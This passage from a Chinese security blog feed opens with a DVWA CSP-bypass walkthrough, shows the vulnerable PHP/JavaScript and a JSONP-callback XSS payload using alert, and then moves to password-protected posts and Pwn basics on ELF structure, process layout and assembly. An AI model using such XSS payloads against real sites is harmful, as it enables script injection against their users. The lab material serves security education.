<h5 id="High"><a href="#High" class="headerlink" title="High"></a>High</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// high.php</span><br><span class="line">&lt;?php</span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &quot; . $_POST[&#x27;include&#x27;] . &quot;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;The page makes a call to &#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<p>源代码的 <code>CSP:</code> <code>&quot;Content-Security-Policy: script-src ‘self’;&quot;</code> 意思是只能从本页面调用 <code>javascript</code> 脚本。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// high.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.<span class="property">src</span> = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">solveSum</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;answer&quot;</span>).<span class="property">innerHTML</span> = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="variable language_">document</span>.<span class="property">getElementById</span> (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">    solve_button.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">clickButton</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>点击网页的按钮使 <code>js</code> 生成一个 <code>script</code> 标签，<code>src</code> 指向 <code>source/jsonp.php?callback=solveNum</code>。<code>appendChild()</code> 方法把 <code>“source/jsonp.php?callback=solveNum”</code> 加入到 DOM 中。 <code>solveNum()</code> 函数传入参数 <code>obj</code>，如果字符串 <code>“answer”</code>  在 <code>obj</code> 中就会执行。<code>getElementById()</code> 方法可返回对拥有指定 <code>ID</code> 的第一个对象的引用，<code>innerHTML</code> 属性设置或返回表格行的开始和结束标签之间的 <code>HTML</code>。这里的 <code>script</code> 标签会把远程加载的 <code>solveSum(&#123;&quot;answer&quot;:&quot;15&quot;&#125;)</code> 当作 <code>js</code> 代码执行， 然后这个函数就会在页面显示答案。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// josnp.php</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: application/json; charset=UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">if (array_key_exists (&quot;callback&quot;, $_GET)) &#123;</span><br><span class="line">	$callback = $_GET[&#x27;callback&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	return &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$outp = array (&quot;answer&quot; =&gt; &quot;15&quot;);</span><br><span class="line"></span><br><span class="line">echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>json.php</code> 中的参数通过 <code>get</code> 方式获取，且没有做过滤。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011155419031.png"
                      alt="image-20231011155419031"
                ></p>
<p>通过 <code>POST</code> 传参将 <code>payload:</code> <code>include=&lt;script src=&quot;source/jsonp.php?callback=alert(&#39;xss&#39;);&quot;&gt;&lt;/script&gt;</code> 上传即可。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>关于博客</title>
    <url>/2023/09/20/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h3 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h3><p><strong>主要用来记载Pwn、IOT和Android的相关内容。</strong></p>
<h3 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h3><p><strong>记录一些琐碎。</strong></p>
]]></content>
      <categories>
        <category>Archives</category>
      </categories>
  </entry>
  <entry>
    <title>如何黑掉一颗卫星</title>
    <url>/2023/10/17/%E5%A6%82%E4%BD%95%E9%BB%91%E6%8E%89%E4%B8%80%E9%A2%97%E5%8D%AB%E6%98%9F/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>HAS</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学笔记</title>
    <url>/2023/10/24/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>深入理解Pwn_Base_knowledge</title>
    <url>/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/</url>
    <content><![CDATA[<h1 id="Linux进程布局及ELF文件结构"><a href="#Linux进程布局及ELF文件结构" class="headerlink" title="Linux进程布局及ELF文件结构"></a>Linux进程布局及ELF文件结构</h1><p>这里的讲解并不是很深入，只是浅浅的做了些提示，本文内容是原本准备讲课的提示词，现在在做课程升级，就把之前想要讲课用的内容放在这里。</p>
<h2 id="虚拟地址"><a href="#虚拟地址" class="headerlink" title="虚拟地址"></a>虚拟地址</h2><p>操作系统加载可执行文件后，创建了一个进程，这个进程就有了自己的虚拟地址空间，每个进程的虚拟地址空间都一样。</p>
<h2 id="Linux-进程布局"><a href="#Linux-进程布局" class="headerlink" title="Linux 进程布局"></a>Linux 进程布局</h2><h3 id="32位布局"><a href="#32位布局" class="headerlink" title="32位布局"></a>32位布局</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x32.png"
                      alt="x32"
                ></p>
<ul>
<li><code>Kernel space</code>：<code>0xFFFFFFFF-&gt;0xC0000000</code> 这 <code>1GB</code> 大小的空间被分为内核空间，用户进程无法直接访问内核的虚拟内存空间，仅能通过系统调用来进入内核态，从而来访问指定的内核空间地址。</li>
<li><code>Stack</code>：在用户空间的最顶部的部分被叫做栈空间，它一般用于存放函数参数或局部变量，进程中的每一个线程都有属于自己的栈栈由高地址向低地址增长。</li>
<li><code>Mmap</code>：内核将文件内容映射在此这里，例如加载动态链接库。另外，在 <code>Linux</code> 中，如果你通过 <code>malloc</code> 函数申请一块大于<code>MMAP_THRESHOLD</code> (默认为128KB)大小的堆空间时，<code>glibc</code> 会返回一块匿名的 <code>mmap</code> 内存块而非一块堆内存，也就是匿名映射。</li>
<li><code>Heap</code>：堆同栈一样，都是为进程运行提供动态的内存分配，但其和栈的的一个很大区别在于堆上内存的生命期和执行分配的函数的生命期不一致，堆上分配的内存只有在对应进程通过系统调用主动释放或进程结束后才会释放。</li>
<li><code>BSS</code>：用来存放未初始化的全局或静态变量，程序加载时初始化为 <code>0</code>。</li>
<li><code>Data</code>：用来存放初始化的全局或者静态变量。</li>
<li><code>Text</code>：这段中存有程序的指令代码。<code>Text</code> 段是通过只读的方式加载到内存中的，他在多个进程中是可以被安全共享的。</li>
<li><code>0x00000000~0x80480000</code>：<code>Reserve</code>（保留区），用户不可访问。</li>
</ul>
<h3 id="x64进程布局"><a href="#x64进程布局" class="headerlink" title="x64进程布局"></a>x64进程布局</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x64.png"
                      alt="x64"
                ></p>
<p>源码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *data = <span class="string">&quot;hello data&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a==&gt;%d, b==&gt;%d&quot;</span>, a, b);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="二进制简介"><a href="#二进制简介" class="headerlink" title="二进制简介"></a>二进制简介</h2><p>计算机使用二进制系统执行计算，系统执行的机器码被称为二进制代码，二进制文件包含每个程序的所有代码和数据。</p>
<h3 id="C语言编译过程"><a href="#C语言编译过程" class="headerlink" title="C语言编译过程"></a>C语言编译过程</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/image-20231109145303530.png"
                      alt="image-20231109145303530"
                ></p>
<ul>
<li><strong>预处理阶段</strong>：处理<code>#define</code>和<code>#include</code>指令。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -E -P compilation_example.c</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>编译阶段</strong>：将纯C代码转换为汇编语言，编译器优化。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -S -masm=intel compilation_example.c</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>汇编阶段</strong>：将汇编代码转换成机器码，生成可重定位的二进制文件。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -c compilation_example.c</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>链接阶段</strong>：将所有对象文件链接到一个二进制可执行文件，静态库合并到二进制可执行文件，留下符号引用，被动态链接器用来解析动态库的最终依赖关系。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc compilation_example.c</span><br></pre></td></tr></table></figure></div>

<p>源码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORMAT <span class="string">&quot;%s&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MESSAGE <span class="string">&quot;Hello, World\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(FORMAT, MESSAGE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h3><p><a class="link"   href="https://www.man7.org/linux/man-pages/man5/elf.5.html" >源码网址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/ELF.png"
                      alt="ELF"
                ></p>
<p><strong>ELF分类</strong></p>
<ul>
<li><code>ET_NONE</code>：未知类型。这个标记表明文件类型不确定，或者还未定义。</li>
<li><code>ET_REL</code>：重定位文件。ELF 类型标记为 <code>relocatable</code> 意味着该文件 被标记为了一段可重定位的代码，有时也称为目标文件。可重定位 目标文件通常是还未被链接到可执行程序的一段位置独立的代码 （position independent code）。在编译完代码之后通常可以看到一 个.o 格式的文件，这种文件包含了创建可执行文件所需要的代码 和数据。</li>
<li><code>ET_EXEC</code>：可执行文件。ELF 类型为 <code>executable</code>，表明这个文件被标 记为可执行文件。这种类型的文件也称为程序，是一个进程开始执 行的入口。</li>
<li><code>ET_DYN</code>：共享目标文件。ELF 类型为 <code>dynamic</code>，意味着该文件被标记 为了一个动态的可链接的目标文件，也称为共享库。这类共享库会在 程序运行时被装载并链接到程序的进程镜像中。</li>
<li><code>ET_CORE</code>：核心文件。在程序崩溃或者进程传递了一个 <code>SIGSEGV</code> 信号（分段违规）时，会在核心文件中记录整个进程的镜像信息。可以使用 <code>GDB</code> 读取这类文件来辅助调试并查找程序崩溃的原因。</li>
</ul>
<p><strong>ELF头部</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ELF <span class="title">header</span> <span class="params">(Ehdr)</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="keyword">define</span> EI_NIDENT 16</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span>&#123;    </span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> e_ident[EI_NIDENT];	<span class="comment">/* 幻数以及其他信息*/</span>   </span><br><span class="line">	<span class="type">uint16_t</span> e_type;					<span class="comment">/* 对象文件类型*/</span>   </span><br><span class="line">	<span class="type">uint16_t</span> e_machine;					<span class="comment">/* 架构*/</span>  </span><br><span class="line">	<span class="type">uint32_t</span> e_version;					<span class="comment">/* 对象文件版本*/</span>  </span><br><span class="line">    ElfN_Addr e_entry;					<span class="comment">/* 程序入口的虚拟地址*/</span>    </span><br><span class="line">	ElfN_Off e_phoff;					<span class="comment">/* 程序头表的偏移量（按字节计算）*/</span>  </span><br><span class="line">	ElfN_Off e_shoff;					<span class="comment">/* 节头表的偏移量（按字节计算）*/</span>  </span><br><span class="line">	<span class="type">uint32_t</span> e_flags;					<span class="comment">/* 保存与文件相关的、特定于处理器的标 志。标志名称采用EF_machine_flag的格式*/</span></span><br><span class="line">	<span class="type">uint16_t</span> e_ehsize;					<span class="comment">/* ELF头部的大小（按字节计算） */</span>  </span><br><span class="line">	<span class="type">uint16_t</span> e_phentsize;				<span class="comment">/* 程序头表的条目大小（按字节计算） */</span></span><br><span class="line">	<span class="type">uint16_t</span> e_phnum;					<span class="comment">/* 程序头表的条目数，可以为0 */</span>    </span><br><span class="line">	<span class="type">uint16_t</span> e_shentsize;				<span class="comment">/* 节头表的条目大小（按字节计算） */</span>    </span><br><span class="line">	<span class="type">uint16_t</span> e_shnum;					<span class="comment">/* 节头表的条目数，可以为0 */</span>    </span><br><span class="line">	<span class="type">uint16_t</span> e_shstrndx;<span class="comment">/* 节头表中与节名称字符串表相关的条目的 索引。如果文件没有节名称字符串表，此参数可以为SHN_UNDEF */</span> </span><br><span class="line">&#125; ElfN_Ehdr; </span><br></pre></td></tr></table></figure></div>

<p><strong>ELF程序头</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Program <span class="title">header</span> <span class="params">(Phdr)</span><span class="keyword">typedef</span> <span class="keyword">struct</span> </span>&#123;  </span><br><span class="line">	<span class="type">uint32_t</span> p_type;	<span class="comment">/*segment type*/</span>  </span><br><span class="line">	Elf32_Off p_offset;	<span class="comment">/*segment offset*/</span>   </span><br><span class="line">	Elf32_Addr p_vaddr;	<span class="comment">/*segment virtual addr*/</span>    </span><br><span class="line">	Elf32_Addr p_paddr;	<span class="comment">/*segment physical addr*/</span>   </span><br><span class="line">	<span class="type">uint32_t</span> p_filesz;	<span class="comment">/*size of segment in the file*/</span>    </span><br><span class="line">	<span class="type">uint32_t</span> p_memsz;	<span class="comment">/*size of segment in the memory*/</span>    </span><br><span class="line">	<span class="type">uint32_t</span> p_flags;	<span class="comment">/*segment flag : R|W|X*/</span>    </span><br><span class="line">	<span class="type">uint32_t</span> p_align;	<span class="comment">/*segment alignment in memory*/</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br><span class="line"><span class="comment">/*FOR 64Bit, p_flags is in total struct*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;	    </span><br><span class="line">	<span class="type">uint32_t</span> p_type;	    </span><br><span class="line">	<span class="type">uint32_t</span> p_flags;    </span><br><span class="line">	Elf64_Off p_offset;    </span><br><span class="line">	Elf64_Addr p_vaddr;    </span><br><span class="line">	Elf64_Addr p_paddr;    </span><br><span class="line">	<span class="type">uint64_t</span> p_filesz;    </span><br><span class="line">	<span class="type">uint64_t</span> p_memsz;    </span><br><span class="line">	<span class="type">uint64_t</span> p_align;</span><br><span class="line">&#125; Elf64_Phdr; </span><br></pre></td></tr></table></figure></div>

<p><strong>ELF节头</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Section <span class="title">header</span> <span class="params">(Shdr)</span>    </span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span>&#123;    </span><br><span class="line">	<span class="type">uint32_t</span> sh_name;	<span class="comment">// offset into shdr string table for shdr name	    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_type;	<span class="comment">// shdr type I.E SHT_PROGBITS    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_flags;	<span class="comment">// shdr flags I.E SHT_WRITE|SHT_ALLOC     </span></span><br><span class="line">	Elf32_Addr sh_addr;	<span class="comment">// address of where section begins    </span></span><br><span class="line">	Elf32_Off sh_offset;	<span class="comment">// offset of shdr from beginning of file    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_size;	<span class="comment">// size that section takes up on disk    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_link;	<span class="comment">// points to another section    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_info;	<span class="comment">// interpretation depends on section type    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_addralign;	<span class="comment">// alignment for address of section     </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_entsize;	<span class="comment">// size of each certain entries that may be in </span></span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;    </span><br><span class="line">	<span class="type">uint32_t</span> sh_name;	/ * <span class="function">Section <span class="title">name</span> <span class="params">(string tbl index)</span> */    </span></span><br><span class="line"><span class="function">	<span class="type">uint32_t</span> sh_type</span>;	/ * Section type */    </span><br><span class="line">	<span class="type">uint64_t</span> sh_flags;	/ * Section flags */    </span><br><span class="line">	Elf64_Addr sh_addr;	/ * Section <span class="keyword">virtual</span> addr at execution */    </span><br><span class="line">	Elf64_Off sh_offset;	/ * Section file offset */   </span><br><span class="line">	<span class="type">uint64_t</span> sh_size;	/ * Section size in bytes */    </span><br><span class="line">	<span class="type">uint32_t</span> sh_link;	/ * Link to another section */    </span><br><span class="line">	<span class="type">uint32_t</span> sh_info;	/ * Additional section information */   </span><br><span class="line">	<span class="type">uint64_t</span> sh_addralign;	/ * Section alignment */    </span><br><span class="line">	<span class="type">uint64_t</span> sh_entsize;	/ * Entry size <span class="keyword">if</span> section holds table */</span><br><span class="line">&#125; Elf64_Shdr; </span><br></pre></td></tr></table></figure></div>

<p><strong>ELF重要节</strong></p>
<ul>
<li><code>.init</code> 节和 <code>.fini</code> 节。</li>
<li><code>.text</code> 节。</li>
<li><code>.bss</code> 节, <code>.data</code> 节, <code>.rodata</code> 节。</li>
<li>延迟绑定 <code>.plt</code>, <code>.got</code>, <code>.got.plt</code>。</li>
<li><code>.rel.*</code>, <code>.rela.*</code> 节。</li>
<li><code>.dynamic</code> 节。</li>
<li><code>.init_array</code> 和 <code>.fini_array</code>。</li>
<li><code>.shstrtab</code>, <code>.symtab</code>, <code>.strtab</code>, <code>.dynsym</code>,  <code>.hash</code> 及 <code>.dynstr</code>节。</li>
<li><code>.ctors</code> 和 <code>.dtors</code> 节 。</li>
</ul>
<h3 id="符号和剥离的二进制文件"><a href="#符号和剥离的二进制文件" class="headerlink" title="符号和剥离的二进制文件"></a>符号和剥离的二进制文件</h3><p>高级源代码（如C代码）均以有意义的、人类可读的函数和变量命名为中心。编译程序时，编译器会翻译符号，这些符号会跟踪其名称，并记录哪些二进制代码和数据对应哪个符号。如函数符号提供符 号从高级函数名称到第一个地址和每个函数的大小的映射。链接器在组合对象文件时通常使用此信息，例如，使用此信息来解析模块之间的函数和变量引用，并且帮助调试。</p>
<p>可以使用命令查看二进制文件的符合信息。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">readelf --syms a.out</span><br></pre></td></tr></table></figure></div>

<p><code>GCC</code> 的默认行为是不自动剥离新编译 的二进制文件。如果你想知道带符号的二进制文件最终是如何被剥离 的，可以使用 <code>strip</code> 命令。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">strip --strip-all a.out</span><br></pre></td></tr></table></figure></div>

<h3 id="二进制文件的加载"><a href="#二进制文件的加载" class="headerlink" title="二进制文件的加载"></a>二进制文件的加载</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/image-20231109145853764.png"
                      alt="image-20231109145853764"
                ></p>
<ul>
<li>创建一个进程，包含虚拟地址空间。</li>
<li>将解释器映射到进程的虚拟内存中，它用于加载二进制文件并执行必要的重定位操作，一般名字为 <code>ld-linux.so</code>。解释器加载后内核将控制权交给解释器，解释器会在用户空间工作。</li>
<li>解释器解析并找出二进制文件使用的动态库，并将其映射到虚拟地址空间，然后在代码节执行所有必要的重定位。</li>
</ul>
<h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p>二进制文件加载到进程中执行的时候动态链接器执行了最后的重定位。例如在编译时由于不知道加载地址，因此它会解析共享库中函数的引用。这里需要简单介绍一下，实际上在加载二进制文件的时候许多重定位一般都不会立即完成，而是延迟到对未解析位置进行首次引用之前，这就是延迟绑定。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/plt.got.png"
                      alt="plt.got"
                ></p>
<h2 id="推荐书籍"><a href="#推荐书籍" class="headerlink" title="推荐书籍"></a>推荐书籍</h2><p>《二进制分析实战》</p>
<p>《Linux二进制分析》</p>
<h1 id="汇编语言基础"><a href="#汇编语言基础" class="headerlink" title="汇编语言基础"></a>汇编语言基础</h1><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p><code>x32</code> 寄存器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x32reg.jpg"
                      alt="x32reg"
                ></p>
<p><code>x64</code> 寄存器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x64reg.png"
                      alt="x64reg"
                ></p>
<h2 id="常见汇编指令"><a href="#常见汇编指令" class="headerlink" title="常见汇编指令"></a>常见汇编指令</h2><p><strong>mov 操作数，源操作数</strong></p>
<p><code>mov</code> 指令将第二个操作数（可以是寄存器的内容、内存中的内容或值）复制到第一个操作数（寄存器或内存）。mov不能用于直接从内存复制到内存</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov &lt;reg&gt;,&lt;reg&gt;  	; mov rax, rbx</span><br><span class="line">mov &lt;reg&gt;,&lt;mem&gt;		; mov rax, [rbc] ; mov edx, [esi+4*ebx + 0x8]   </span><br><span class="line">mov &lt;mem&gt;,&lt;reg&gt;		; mov [rax], rbx</span><br><span class="line">mov &lt;reg&gt;,&lt;const&gt;	; mov rax, 0x8</span><br><span class="line">mov &lt;mem&gt;,&lt;const&gt;	; mov [rax], 0xff</span><br></pre></td></tr></table></figure></div>

<p><strong>push 操作数</strong></p>
<p><code>push</code> 指令将操作数压入内存的栈中，并且<code>rsp - 8 / esp - 4</code>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push &lt;reg&gt;			; push rax</span><br><span class="line">push &lt;mem&gt;			; push [rdx]</span><br><span class="line">push &lt;con&gt;			; push 0xff</span><br></pre></td></tr></table></figure></div>

<p><strong>pop 操作数</strong></p>
<p><code>pop</code> 指令与 <code>push</code> 指令相反，它执行的是出栈的工作，并且 <code>rsp + 8 / esp + 4</code>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop &lt;reg&gt;			; pop rax</span><br><span class="line">pop &lt;mem&gt;			; pop [rdi]</span><br></pre></td></tr></table></figure></div>

<p><strong>lea 操作数，源操作数</strong></p>
<p><code>lea</code> 实际上是一个载入有效地址指令，将第二个操作数表示的地址载入到第一个操作数（寄存器）中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea &lt;reg&gt;,&lt;mem&gt;		; lea edi, [ebx+4*esi] </span><br></pre></td></tr></table></figure></div>

<p><strong>add 操作数，源操作数</strong></p>
<p><code>add</code> 指令将两个操作数相加，且将相加后的结果保存到第一个操作数中。</p>
